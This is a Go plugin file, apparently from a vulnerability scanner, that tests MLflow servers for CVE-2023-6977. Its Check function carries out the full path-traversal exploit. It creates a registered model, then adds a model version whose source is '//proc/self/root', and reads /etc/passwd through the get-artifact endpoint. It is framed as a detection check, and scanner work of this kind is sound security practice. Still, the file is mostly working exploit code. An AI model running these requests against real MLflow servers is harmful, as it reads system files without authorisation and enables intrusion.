package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"fmt"
	"net/http"
	"strings"
)

func init() {
	Register("mlflow_file_read_cve_2023_6977", &mlflow_file_read_cve_2023_6977{})
}

type mlflow_file_read_cve_2023_6977 struct{}

func (p *mlflow_file_read_cve_2023_6977) Info() PluginInfo {
	return PluginInfo{
		Name:     "MLflow 任意文件读取漏洞",
		VulnInfo: "MLflow 是由 Apache Spark 技术团队开源的一个机器学习平台。该漏洞使恶意用户能够读取服务器上的敏感文件。攻击者可以通过利用此漏洞获取未经授权的访问权限，从而读取服务器上存储的敏感信息。",
		VulnID:   "CVE-2023-6977",
		Level:    "7.5 HIGH",
		URL:      "",
		Version:  "version < 2.9.2",
		CWE:      "CWE-29	路径遍历",
	}
}

func (p *mlflow_file_read_cve_2023_6977) Check(netloc string) bool {
	model_name := utils.GenRandom(6)
	payload1 := fmt.Sprintf(`{"name":"%s"}`, model_name)
	url1 := netloc + "/ajax-api/2.0/mlflow/registered-models/create"
	create_req, err := http.NewRequest("POST", url1, bytes.NewBufferString(payload1))
	if err != nil {
		return false
	}
	create_req.Header.Set("Content-Type", "application/json")
	create_resp, err := utils.RequestDo(create_req, true, 2)
	if err != nil {
		return false
	}

	if create_resp.Other.StatusCode == 200 && strings.Contains(create_resp.ResponseRaw, model_name) {
		url2 := netloc + "/ajax-api/2.0/mlflow/model-versions/create"
		payload2 := fmt.Sprintf(`{"name":"%s","source":"//proc/self/root"}`, model_name)
		create_req2, err := http.NewRequest("POST", url2, bytes.NewBufferString(payload2))
		if err != nil {
			return false
		}
		create_req2.Header.Set("Content-Type", "application/json")
		create_resp2, err := utils.RequestDo(create_req2, true, 2)
		if err != nil {
			return false
		}

		if create_resp2.Other.StatusCode == 200 && strings.Contains(create_resp2.ResponseRaw, model_name) {
			check_url := netloc + "/model-versions/get-artifact?name=" + model_name + "&path=etc%2Fpasswd&version=1"
			check_req, err := http.NewRequest("GET", check_url, nil)
			if err != nil {
				return false
			}
			check_resp, err := utils.RequestDo(check_req, true, 2)
			if err != nil {
				return false
			}

			if check_resp.Other.StatusCode == 200 && strings.Contains(check_resp.ResponseRaw, "root:/root") {
				return true
			}
		}
	}
	return false
}
